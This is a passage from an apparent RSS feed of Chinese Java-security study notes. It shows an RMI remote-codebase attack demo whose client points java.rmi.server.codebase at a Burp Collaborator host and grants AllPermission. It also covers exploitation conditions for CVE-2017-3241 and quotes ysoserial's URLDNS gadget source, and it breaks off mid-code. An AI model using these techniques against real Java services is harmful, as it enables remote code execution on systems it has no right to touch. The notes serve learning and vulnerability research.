&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CalcServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// client.policy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">grant&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">permission&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">security&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">AllPermission&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Client部分（确保与Server的classpath不同）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// HelloClient.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.ArrayList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloClient&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Payload&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ICalc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">li&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Payload&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.codebase&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloClient&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行CalcServer和HelloClient，会看到client的报错&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc
&lt;/code>&lt;/pre>&lt;p>同时注意到我们的burp收到了请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220504013700746.png" alt="image-20220504013700746">&lt;/p>
&lt;p>利用的话将class放在Web服务器的 /RMIClient$Payload.class即可&lt;/p>
&lt;p>codebase通过&lt;code>[Ljava.rmi.server.ObjID;&lt;/code>的&lt;code>classAnnotations&lt;/code>（由&lt;code>annotateClass&lt;/code>方法写入）传递，所以即使我们没有RMI客户端，只要修改&lt;code>classAnnotations&lt;/code>的值就可以控制codebase，指向我们的网站&lt;/p>
&lt;h2 id="cve-2017-3241">CVE-2017-3241&lt;/h2>
&lt;p>&lt;a href="https://www.daimajiaoliu.com/daima/4761a96151003fc">Java RMI远程反序列化任意类及远程代码执行解析（CVE-2017-3241 ）&lt;/a> | &lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">CVE-2017-3241-POC&lt;/a> | &lt;a href="http://www.code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">CVE-2017-3241 Java RMI Registry.bind()反序列化漏洞&lt;/a> | &lt;a href="https://blog.csdn.net/LeeHDsniper/article/details/71599504">JAVA RMI 反序列化远程命令执行漏洞&lt;/a> | &lt;a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">一次攻击内网rmi服务的深思&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/85846">【技术分享】Java AMF3 反序列化漏洞分析&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&amp;lt;=8u112 直接利用&lt;/p>
&lt;p>8u112&amp;lt; JDK &amp;lt; 8u241 需要反链恶意JRMP服务端，所以需要目标服务器能访问攻击者控制的服务器&lt;/p>
&lt;/blockquote>
&lt;p>TL;DR：对于RMI服务，server端除了正常实现rmi接口的A类之外还存在一个实现了readObject方法的PublicKnown类（比如常见的cc），我们的恶意客户端可以在本地用完整的类名重写A类（调用PublicKnown的反序列化相关方法进行rce）并作为RMI的参数传入，触发rce；poc代码请参见&lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">这里&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/1599551987770-38f4ea97-a031-4790-b11d-e73e60eab647.png" alt="image.png">&lt;/p>
&lt;p>具体的各版本绕过参考上面的🔗，我就不班门弄斧了喵（）&lt;/p></description></item><item><title>Java学习笔记Ⅲ</title><link>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</link><pubDate>Wed, 23 Mar 2022 18:40:31 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</guid><description>&lt;h2 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h2>
&lt;p>与PHP类似，java的&lt;code>readObject&lt;/code>对标&lt;code>__wakeup&lt;/code>，但不完全一样，&lt;code>readObject&lt;/code>倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的&lt;code>__wakeup&lt;/code>倾向于解决“反序列化后如何初始化这个对象”的问题，它可以在反序列化之后执行初始化操作，该赋的值基本由&lt;code>__construct&lt;/code>控制，真正的入手点一般在&lt;code>__destruct&lt;/code>中&lt;/p>
&lt;p>对java来说，一个可利用的&lt;code>readObject&lt;/code>是链子最初的起点&lt;/p>
&lt;p>在序列化对象时会调用对象的&lt;code>writeObject&lt;/code>方法，参数类型是&lt;code>ObjectOutputStream&lt;/code>，这个类有一个&lt;code>annotateClass&lt;/code>方法，可以通过重写这个方法来向序列化后的数据中写入内容，这个内容位于&lt;code>objectAnnotation&lt;/code>中&lt;/p>
&lt;p>相应的，反序列化时会调用&lt;code>readObject&lt;/code>，可以读出前面写入的内容进行处理&lt;/p>
&lt;p>python的反序列化危害最大，可以直接操控PVM栈上的指令&lt;/p>
&lt;h2 id="urldns">URLDNS&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">URLDNS&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Avoid DNS resolution during payload creation
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SilentURLStreamHandler&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">ht&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// HashMap that will contain the URL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// URL to use as the Key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URLDNS&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SilentURLStreamHandler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">URLConnection&lt;/span> &lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">InetAddress&lt;/span> &lt;span style="color:#75af00">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是yoserial中URLDNS部分的源码，很短&lt;/p>
&lt;p>整个链子的攻击利用的是HashMap会调用key的hashCode方法来定位对应的value，当url object作为key时会由于hashCode的计算进而触发DNS请求（因为要解析hostname是否指向同一个Ip&lt;/p>
&lt;h3 id="hashmap">HashMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
